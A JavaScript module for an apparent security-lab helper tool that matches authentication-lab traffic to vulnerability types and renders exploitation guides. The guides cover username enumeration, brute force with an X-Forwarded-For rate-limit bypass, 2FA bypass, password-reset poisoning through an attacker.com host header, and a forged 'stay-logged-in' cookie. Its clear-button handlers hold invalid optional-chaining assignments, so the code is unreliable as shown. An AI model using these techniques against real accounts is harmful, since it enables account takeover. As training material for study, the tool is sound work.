// Vulnerability Analyzer Module
import { authManager } from './auth.js';
import { db, collection, addDoc, serverTimestamp } from './firebase-config.js';

class VulnerabilityAnalyzer {
    constructor() {
        this.labPatterns = this.initializeLabPatterns();
        this.currentAnalysis = null;
    }

    initializeLabPatterns() {
        return [
            {
                id: 'username-enumeration-timing',
                category: 'Username Enumeration via Response Timing',
                indicators: ['response time', 'timing difference', 'delay', 'sleep'],
                keywords: ['username', 'timing', 'response time', 'delay'],
                confidence: 'high'
            },
            {
                id: 'username-enumeration-message',
                category: 'Username Enumeration via Different Responses',
                indicators: ['invalid username', 'incorrect password', 'user not found', 'account does not exist'],
                keywords: ['username', 'error message', 'different response'],
                confidence: 'high'
            },
            {
                id: 'broken-brute-force-protection',
                category: 'Broken Brute-Force Protection',
                indicators: ['account locked', 'too many attempts', 'rate limit', 'lockout'],
                keywords: ['brute force', 'rate limit', 'lockout', 'bypass'],
                confidence: 'high'
            },
            {
                id: 'username-enumeration-subtly',
                category: 'Username Enumeration via Subtly Different Responses',
                indicators: ['content-length', 'response size', 'subtle difference'],
                keywords: ['subtle', 'content-length', 'response size'],
                confidence: 'medium'
            },
            {
                id: '2fa-simple-bypass',
                category: '2FA Simple Bypass',
                indicators: ['2fa', 'mfa', 'verification code', 'two-factor'],
                keywords: ['bypass', 'skip', 'direct access', '2fa'],
                confidence: 'high'
            },
            {
                id: '2fa-broken-logic',
                category: '2FA Broken Logic',
                indicators: ['verify', 'cookie', 'session', 'user parameter'],
                keywords: ['2fa', 'broken logic', 'parameter manipulation'],
                confidence: 'high'
            },
            {
                id: 'password-reset-poisoning',
                category: 'Password Reset Poisoning',
                indicators: ['password reset', 'reset link', 'x-forwarded-host', 'host header'],
                keywords: ['password reset', 'host header', 'poisoning'],
                confidence: 'high'
            },
            {
                id: 'password-reset-token-leak',
                category: 'Password Reset Token Leak',
                indicators: ['reset token', 'referer', 'referrer'],
                keywords: ['password reset', 'token', 'leak', 'referer'],
                confidence: 'medium'
            },
            {
                id: 'stay-logged-in-broken',
                category: 'Broken "Stay Logged In" Functionality',
                indicators: ['stay-logged-in', 'remember-me', 'persistent cookie'],
                keywords: ['cookie', 'base64', 'md5', 'weak encryption'],
                confidence: 'high'
            },
            {
                id: 'offline-password-cracking',
                category: 'Offline Password Cracking',
                indicators: ['cookie', 'base64', 'hash', 'encrypted'],
                keywords: ['decrypt', 'crack', 'hash', 'cookie'],
                confidence: 'medium'
            },
            {
                id: 'password-change-broken',
                category: 'Password Change Broken Logic',
                indicators: ['change password', 'current password', 'new password'],
                keywords: ['password change', 'missing verification', 'parameter'],
                confidence: 'high'
            },
            {
                id: 'password-brute-force-protection-bypass',
                category: 'Password Brute-Force Protection Bypass',
                indicators: ['x-forwarded-for', 'ip rotation', 'rate limit bypass'],
                keywords: ['brute force', 'bypass', 'ip', 'header'],
                confidence: 'high'
            }
        ];
    }

    async analyze(labUrl, labDescription, httpRequest, httpResponse) {
        try {
            // Show loading
            this.showLoading(true);

            // Parse inputs
            const parsedRequest = this.parseHttpRequest(httpRequest);
            const parsedResponse = this.parseHttpResponse(httpResponse);

            // Detect vulnerability
            const detection = this.detectVulnerability(labDescription, parsedRequest, parsedResponse);

            // Generate exploitation guide
            const exploitation = this.generateExploitation(detection, parsedRequest, parsedResponse);

            // Combine results
            this.currentAnalysis = {
                labUrl,
                labDescription,
                detection,
                exploitation,
                request: parsedRequest,
                response: parsedResponse,
                timestamp: new Date().toISOString()
            };

            // Display results
            this.displayResults(this.currentAnalysis);

            // Hide loading
            this.showLoading(false);

            return this.currentAnalysis;
        } catch (error) {
            console.error('Analysis error:', error);
            this.showLoading(false);
            throw error;
        }
    }

    parseHttpRequest(requestText) {
        const lines = requestText.trim().split('\n');
        const [method, path, protocol] = lines[0].split(' ');

        const headers = {};
        let bodyStart = 1;

        for (let i = 1; i < lines.length; i++) {
            const line = lines[i].trim();
            if (line === '') {
                bodyStart = i + 1;
                break;
            }
            const [key, ...valueParts] = line.split(':');
            if (key && valueParts.length > 0) {
                headers[key.trim()] = valueParts.join(':').trim();
            }
        }

        const body = lines.slice(bodyStart).join('\n').trim();

        return { method, path, protocol, headers, body, raw: requestText };
    }

    parseHttpResponse(responseText) {
        const lines = responseText.trim().split('\n');
        const [protocol, statusCode, ...statusParts] = lines[0].split(' ');
        const statusText = statusParts.join(' ');

        const headers = {};
        let bodyStart = 1;

        for (let i = 1; i < lines.length; i++) {
            const line = lines[i].trim();
            if (line === '') {
                bodyStart = i + 1;
                break;
            }
            const [key, ...valueParts] = line.split(':');
            if (key && valueParts.length > 0) {
                headers[key.trim()] = valueParts.join(':').trim();
            }
        }

        const body = lines.slice(bodyStart).join('\n').trim();

        return { protocol, statusCode: parseInt(statusCode), statusText, headers, body, raw: responseText };
    }

    detectVulnerability(labDescription, request, response) {
        const combinedText = `${labDescription} ${request.raw} ${response.raw}`.toLowerCase();

        let bestMatch = null;
        let highestScore = 0;

        for (const pattern of this.labPatterns) {
            let score = 0;

            // Check indicators
            for (const indicator of pattern.indicators) {
                if (combinedText.includes(indicator.toLowerCase())) {
                    score += 3;
                }
            }

            // Check keywords
            for (const keyword of pattern.keywords) {
                if (combinedText.includes(keyword.toLowerCase())) {
                    score += 2;
                }
            }

            if (score > highestScore) {
                highestScore = score;
                bestMatch = pattern;
            }
        }

        // Additional specific checks
        const indicators = this.extractIndicators(request, response);

        return {
            category: bestMatch ? bestMatch.category : 'Unknown Authentication Vulnerability',
            confidence: highestScore > 5 ? 'high' : highestScore > 2 ? 'medium' : 'low',
            score: highestScore,
            pattern: bestMatch,
            indicators
        };
    }

    extractIndicators(request, response) {
        const indicators = [];

        // Error messages
        if (response.body.match(/invalid|incorrect|wrong|not found|does not exist/i)) {
            indicators.push({
                type: 'Error Message',
                value: 'Descriptive error messages detected',
                impact: 'May allow username enumeration'
            });
        }

        // Status codes
        if (response.statusCode === 401 || response.statusCode === 403) {
            indicators.push({
                type: 'Status Code',
                value: `${response.statusCode} ${response.statusText}`,
                impact: 'Authentication failure response'
            });
        }

        // Cookies
        if (response.headers['Set-Cookie'] || response.headers['set-cookie']) {
            indicators.push({
                type: 'Session Cookie',
                value: response.headers['Set-Cookie'] || response.headers['set-cookie'],
                impact: 'Session management detected'
            });
        }

        // Content-Length differences
        if (response.headers['Content-Length']) {
            indicators.push({
                type: 'Response Size',
                value: `${response.headers['Content-Length']} bytes`,
                impact: 'Response size may vary based on input'
            });
        }

        // Redirects
        if (response.statusCode >= 300 && response.statusCode < 400) {
            indicators.push({
                type: 'Redirect',
                value: response.headers['Location'] || 'Redirect detected',
                impact: 'May indicate successful authentication'
            });
        }

        return indicators;
    }

    generateExploitation(detection, request, response) {
        const category = detection.category;

        // Generate specific exploitation based on category
        if (category.includes('Username Enumeration')) {
            return this.generateUsernameEnumerationExploit(detection, request, response);
        } else if (category.includes('Brute-Force')) {
            return this.generateBruteForceExploit(detection, request, response);
        } else if (category.includes('2FA') || category.includes('MFA')) {
            return this.generate2FAExploit(detection, request, response);
        } else if (category.includes('Password Reset')) {
            return this.generatePasswordResetExploit(detection, request, response);
        } else if (category.includes('Stay Logged In')) {
            return this.generateStayLoggedInExploit(detection, request, response);
        } else {
            return this.generateGenericExploit(detection, request, response);
        }
    }

    generateUsernameEnumerationExploit(detection, request, response) {
        return {
            steps: [
                {
                    title: 'Intercept Login Request',
                    description: 'Use Burp Suite Proxy to intercept the login POST request'
                },
                {
                    title: 'Send to Intruder',
                    description: 'Right-click the request and select "Send to Intruder"'
                },
                {
                    title: 'Configure Payload Positions',
                    description: 'Set the username parameter as the payload position. Clear other positions.'
                },
                {
                    title: 'Load Username List',
                    description: 'In Intruder > Payloads, load the provided username list'
                },
                {
                    title: 'Start Attack',
                    description: 'Click "Start attack" and analyze responses for differences in timing, length, or error messages'
                },
                {
                    title: 'Identify Valid Username',
                    description: 'Look for responses that differ from the majority - this indicates a valid username'
                }
            ],
            burpTools: [
                {
                    tool: 'Intruder',
                    config: [
                        'Attack type: Sniper',
                        'Payload position: username parameter',
                        'Payload type: Simple list',
                        'Grep - Extract: Error messages or response indicators'
                    ]
                },
                {
                    tool: 'Comparer',
                    config: [
                        'Compare responses with different usernames',
                        'Look for subtle differences in HTML, headers, or timing'
                    ]
                }
            ],
            payloads: [
                {
                    name: 'Username List',
                    value: 'admin\nroot\nuser\nadministrator\ntest\nguest'
                },
                {
                    name: 'Example Request',
                    value: `POST /login HTTP/1.1\nHost: vulnerable-site.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=§admin§&password=test123`
                }
            ],
            successCondition: 'You have identified one or more valid usernames based on response differences. Proceed to brute-force the password for the valid username(s).',
            security: {
                why: 'The application provides different responses (error messages, timing, or response size) for valid vs invalid usernames, allowing attackers to enumerate valid accounts.',
                how: 'Attackers can automate username enumeration to build a list of valid accounts, then focus password attacks on these accounts.',
                remediation: 'Use generic error messages like "Invalid credentials" for all authentication failures. Implement consistent response times and sizes regardless of username validity.'
            }
        };
    }

    generateBruteForceExploit(detection, request, response) {
        return {
            steps: [
                {
                    title: 'Identify Valid Username',
                    description: 'First enumerate valid usernames using the username enumeration technique'
                },
                {
                    title: 'Configure Intruder for Password Attack',
                    description: 'Send login request to Intruder and set password as payload position'
                },
                {
                    title: 'Load Password List',
                    description: 'Use a common password list (e.g., rockyou.txt subset)'
                },
                {
                    title: 'Bypass Rate Limiting (if applicable)',
                    description: 'Add X-Forwarded-For header with rotating IPs, or insert valid login between attempts'
                },
                {
                    title: 'Execute Attack',
                    description: 'Start the attack and monitor for successful login (different status code or redirect)'
                },
                {
                    title: 'Verify Access',
                    description: 'Use the discovered credentials to log in and verify access'
                }
            ],
            burpTools: [
                {
                    tool: 'Intruder',
                    config: [
                        'Attack type: Sniper',
                        'Payload position: password parameter',
                        'Payload type: Simple list (password wordlist)',
                        'Resource pool: Maximum concurrent requests = 1 (to avoid detection)'
                    ]
                },
                {
                    tool: 'Repeater',
                    config: [
                        'Test successful credentials',
                        'Verify session establishment'
                    ]
                }
            ],
            payloads: [
                {
                    name: 'Password List (Top 100)',
                    value: 'password\n123456\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\ntrustno1\ndragon'
                },
                {
                    name: 'Rate Limit Bypass',
                    value: 'X-Forwarded-For: 1.2.3.§4§'
                }
            ],
            successCondition: 'Successful login with status code 302 redirect or 200 OK with session cookie. Access to authenticated area confirmed.',
            security: {
                why: 'Weak or missing brute-force protection allows unlimited login attempts, enabling password guessing attacks.',
                how: 'Attackers use automated tools to try thousands of passwords against known usernames until finding valid credentials.',
                remediation: 'Implement account lockout after failed attempts, CAPTCHA, rate limiting by IP, and multi-factor authentication.'
            }
        };
    }

    generate2FAExploit(detection, request, response) {
        return {
            steps: [
                {
                    title: 'Complete First Authentication Factor',
                    description: 'Log in with valid credentials to reach the 2FA page'
                },
                {
                    title: 'Intercept 2FA Request',
                    description: 'Capture the request that submits the 2FA code'
                },
                {
                    title: 'Test Direct Access',
                    description: 'Try accessing the post-login page directly, bypassing 2FA verification'
                },
                {
                    title: 'Analyze Session Cookies',
                    description: 'Check if session is established before 2FA verification'
                },
                {
                    title: 'Test Parameter Manipulation',
                    description: 'If 2FA uses a user parameter, try changing it to target victim account'
                },
                {
                    title: 'Verify Bypass',
                    description: 'Confirm access to authenticated area without completing 2FA'
                }
            ],
            burpTools: [
                {
                    tool: 'Repeater',
                    config: [
                        'Test direct access to protected pages',
                        'Modify user parameters in 2FA verification',
                        'Test session validity before 2FA completion'
                    ]
                },
                {
                    tool: 'Proxy',
                    config: [
                        'Intercept and drop 2FA verification request',
                        'Forward directly to protected page'
                    ]
                }
            ],
            payloads: [
                {
                    name: 'Direct Access Test',
                    value: 'GET /my-account HTTP/1.1\nHost: vulnerable-site.com\nCookie: session=abc123'
                },
                {
                    name: 'Parameter Manipulation',
                    value: 'POST /verify-2fa HTTP/1.1\n\nverify-code=1234&user=carlos'
                }
            ],
            successCondition: 'Access to authenticated user account without completing 2FA verification.',
            security: {
                why: '2FA implementation has logic flaws - either verification is not enforced, or user context is not properly validated.',
                how: 'Attackers can bypass 2FA by accessing protected pages directly or manipulating user parameters during verification.',
                remediation: 'Enforce 2FA verification before granting any authenticated access. Validate user context in session, not request parameters. Implement proper state management.'
            }
        };
    }

    generatePasswordResetExploit(detection, request, response) {
        return {
            steps: [
                {
                    title: 'Initiate Password Reset',
                    description: 'Request password reset for target account'
                },
                {
                    title: 'Intercept Reset Request',
                    description: 'Capture the password reset request in Burp Proxy'
                },
                {
                    title: 'Inject Host Header',
                    description: 'Add or modify X-Forwarded-Host header to point to attacker-controlled domain'
                },
                {
                    title: 'Monitor for Token',
                    description: 'Check if reset link sent to victim contains attacker domain'
                },
                {
                    title: 'Capture Reset Token',
                    description: 'When victim clicks link, capture the reset token from your server logs'
                },
                {
                    title: 'Use Token to Reset Password',
                    description: 'Use the captured token to reset victim password'
                }
            ],
            burpTools: [
                {
                    tool: 'Repeater',
                    config: [
                        'Test different host header values',
                        'Verify reset link generation',
                        'Test token usage'
                    ]
                },
                {
                    tool: 'Collaborator',
                    config: [
                        'Use Burp Collaborator to receive callbacks',
                        'Monitor for reset token leakage'
                    ]
                }
            ],
            payloads: [
                {
                    name: 'Host Header Injection',
                    value: 'POST /forgot-password HTTP/1.1\nHost: vulnerable-site.com\nX-Forwarded-Host: attacker.com\n\nemail=victim@email.com'
                }
            ],
            successCondition: 'Password reset token for victim account is captured and used to reset their password.',
            security: {
                why: 'Application trusts user-controllable headers (like X-Forwarded-Host) when generating password reset links.',
                how: 'Attackers manipulate host headers to inject their domain into reset links, causing tokens to be sent to attacker-controlled servers.',
                remediation: 'Use application configuration for domain in reset links, not request headers. Validate and whitelist allowed hosts. Use absolute URLs from configuration.'
            }
        };
    }

    generateStayLoggedInExploit(detection, request, response) {
        return {
            steps: [
                {
                    title: 'Analyze Stay-Logged-In Cookie',
                    description: 'Log in with "Stay logged in" option and capture the cookie'
                },
                {
                    title: 'Decode Cookie Value',
                    description: 'Base64 decode the cookie to reveal its structure'
                },
                {
                    title: 'Identify Weakness',
                    description: 'Check if cookie contains username:password_hash or predictable pattern'
                },
                {
                    title: 'Craft Malicious Cookie',
                    description: 'Create cookie for target user with known/cracked password hash'
                },
                {
                    title: 'Replace Cookie',
                    description: 'Use Burp to replace your cookie with the crafted one'
                },
                {
                    title: 'Access Victim Account',
                    description: 'Refresh page to be logged in as the victim'
                }
            ],
            burpTools: [
                {
                    tool: 'Decoder',
                    config: [
                        'Decode Base64 cookie values',
                        'Encode crafted cookie values'
                    ]
                },
                {
                    tool: 'Repeater',
                    config: [
                        'Test different cookie values',
                        'Verify session establishment'
                    ]
                }
            ],
            payloads: [
                {
                    name: 'Cookie Analysis',
                    value: 'stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw\n(decodes to: wiener:51dc30ddc473d43a6011e9ebba6ca770)'
                },
                {
                    name: 'Crafted Cookie',
                    value: 'stay-logged-in=Y2FybG9zOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw\n(carlos:51dc30ddc473d43a6011e9ebba6ca770)'
                }
            ],
            successCondition: 'Successfully logged in as victim user by manipulating the stay-logged-in cookie.',
            security: {
                why: 'Stay-logged-in cookie uses weak or predictable encryption (e.g., base64(username:md5(password))) instead of secure session tokens.',
                how: 'Attackers can decode cookies, crack weak hashes, and forge cookies for other users.',
                remediation: 'Use cryptographically secure random session tokens. Never include passwords or hashes in cookies. Implement proper session management with server-side validation.'
            }
        };
    }

    generateGenericExploit(detection, request, response) {
        return {
            steps: [
                {
                    title: 'Analyze Authentication Flow',
                    description: 'Map out the complete authentication process'
                },
                {
                    title: 'Identify Weak Points',
                    description: 'Look for missing validation, parameter manipulation, or logic flaws'
                },
                {
                    title: 'Test Bypass Techniques',
                    description: 'Try common authentication bypass methods'
                },
                {
                    title: 'Exploit Vulnerability',
                    description: 'Use identified weakness to bypass authentication'
                }
            ],
            burpTools: [
                {
                    tool: 'Repeater',
                    config: ['Test various authentication bypass techniques']
                },
                {
                    tool: 'Intruder',
                    config: ['Fuzz parameters and headers']
                }
            ],
            payloads: [
                {
                    name: 'Generic Test',
                    value: 'Analyze the specific vulnerability indicators for targeted exploitation'
                }
            ],
            successCondition: 'Successful bypass of authentication mechanism.',
            security: {
                why: 'Authentication mechanism contains a logic flaw or missing security control.',
                how: 'Attackers exploit the specific weakness to gain unauthorized access.',
                remediation: 'Implement defense in depth: strong authentication, proper session management, input validation, and security testing.'
            }
        };
    }

    displayResults(analysis) {
        const resultsSection = document.getElementById('resultsSection');
        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth', block: 'start' });

        // Vulnerability Category
        const vulnCategory = document.getElementById('vulnCategory');
        vulnCategory.innerHTML = `
            <svg style="width: 24px; height: 24px; margin-right: 8px;" viewBox="0 0 24 24" fill="none">
                <path d="M12 9V11M12 15H12.01M5.07183 19H18.9282C20.4678 19 21.4301 17.3333 20.6603 16L13.7321 4C12.9623 2.66667 11.0377 2.66667 10.2679 4L3.33975 16C2.56995 17.3333 3.53223 19 5.07183 19Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            ${analysis.detection.category}
        `;

        // Confidence
        const vulnConfidence = document.getElementById('vulnConfidence');
        const confidenceClass = `confidence-${analysis.detection.confidence}`;
        vulnConfidence.className = `vuln-confidence ${confidenceClass}`;
        vulnConfidence.textContent = `Confidence: ${analysis.detection.confidence.toUpperCase()}`;

        // Description
        const vulnDescription = document.getElementById('vulnDescription');
        vulnDescription.textContent = `This lab appears to demonstrate a ${analysis.detection.category} vulnerability. The analysis is based on detected patterns in the HTTP traffic and lab description.`;

        // Indicators
        const indicatorsList = document.getElementById('indicatorsList');
        indicatorsList.innerHTML = analysis.detection.indicators.map(indicator => `
            <div class="indicator-item">
                <svg class="indicator-icon" viewBox="0 0 24 24" fill="none">
                    <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <div class="indicator-content">
                    <h4>${indicator.type}</h4>
                    <p><strong>Value:</strong> ${this.escapeHtml(indicator.value)}</p>
                    <p><strong>Impact:</strong> ${indicator.impact}</p>
                </div>
            </div>
        `).join('');

        // Attack Steps
        const attackSteps = document.getElementById('attackSteps');
        attackSteps.innerHTML = analysis.exploitation.steps.map(step => `
            <div class="attack-step">
                <h4>${step.title}</h4>
                <p>${step.description}</p>
            </div>
        `).join('');

        // Burp Configuration
        const burpConfig = document.getElementById('burpConfig');
        burpConfig.innerHTML = analysis.exploitation.burpTools.map(tool => `
            <div class="burp-tool">
                <h4>${tool.tool}</h4>
                <ul>
                    ${tool.config.map(item => `<li>${item}</li>`).join('')}
                </ul>
            </div>
        `).join('');

        // Payloads
        const payloadsList = document.getElementById('payloadsList');
        payloadsList.innerHTML = analysis.exploitation.payloads.map(payload => `
            <div class="payload-item">
                <div class="payload-header">${payload.name}</div>
                <pre class="payload-code">${this.escapeHtml(payload.value)}</pre>
            </div>
        `).join('');

        // Success Condition
        const successCondition = document.getElementById('successCondition');
        successCondition.innerHTML = `
            <svg style="width: 24px; height: 24px; margin-right: 12px; color: #10b981;" viewBox="0 0 24 24" fill="none">
                <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            ${analysis.exploitation.successCondition}
        `;

        // Security Analysis
        const securityAnalysis = document.getElementById('securityAnalysis');
        securityAnalysis.innerHTML = `
            <div class="analysis-section">
                <h4>Why This Vulnerability Exists</h4>
                <p>${analysis.exploitation.security.why}</p>
            </div>
            <div class="analysis-section">
                <h4>How Attackers Exploit It</h4>
                <p>${analysis.exploitation.security.how}</p>
            </div>
            <div class="analysis-section">
                <h4>Remediation</h4>
                <p>${analysis.exploitation.security.remediation}</p>
            </div>
        `;
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    showLoading(show) {
        const overlay = document.getElementById('loadingOverlay');
        overlay.style.display = show ? 'flex' : 'none';
    }

    async saveToHistory() {
        if (!authManager.requireAuth()) {
            return;
        }

        if (!this.currentAnalysis) {
            authManager.showError('No analysis to save');
            return;
        }

        try {
            const historyRef = collection(db, 'analysisHistory');
            await addDoc(historyRef, {
                userId: authManager.currentUser.uid,
                ...this.currentAnalysis,
                createdAt: serverTimestamp()
            });

            authManager.showSuccess('Analysis saved to history!');
        } catch (error) {
            console.error('Error saving to history:', error);
            authManager.showError('Failed to save analysis');
        }
    }
}

// Initialize analyzer
const analyzer = new VulnerabilityAnalyzer();

// Event listeners
document.addEventListener('DOMContentLoaded', () => {
    const analyzeBtn = document.getElementById('analyzeBtn');
    const saveResultsBtn = document.getElementById('saveResultsBtn');
    const clearRequest = document.getElementById('clearRequest');
    const clearResponse = document.getElementById('clearResponse');

    if (analyzeBtn) {
        analyzeBtn.addEventListener('click', async () => {
            const labUrl = document.getElementById('labUrl')?.value;
            const labDescription = document.getElementById('labDescription')?.value;
            const httpRequest = document.getElementById('httpRequest')?.value;
            const httpResponse = document.getElementById('httpResponse')?.value;

            if (!labUrl || !labDescription || !httpRequest || !httpResponse) {
                authManager.showError('Please fill in all fields');
                return;
            }

            try {
                await analyzer.analyze(labUrl, labDescription, httpRequest, httpResponse);
            } catch (error) {
                authManager.showError('Analysis failed. Please check your inputs.');
            }
        });
    }

    if (saveResultsBtn) {
        saveResultsBtn.addEventListener('click', () => {
            analyzer.saveToHistory();
        });
    }

    if (clearRequest) {
        clearRequest.addEventListener('click', () => {
            document.getElementById('httpRequest')?.value = '';
        });
    }

    if (clearResponse) {
        clearResponse.addEventListener('click', () => {
            document.getElementById('httpResponse')?.value = '';
        });
    }
});

export { analyzer };
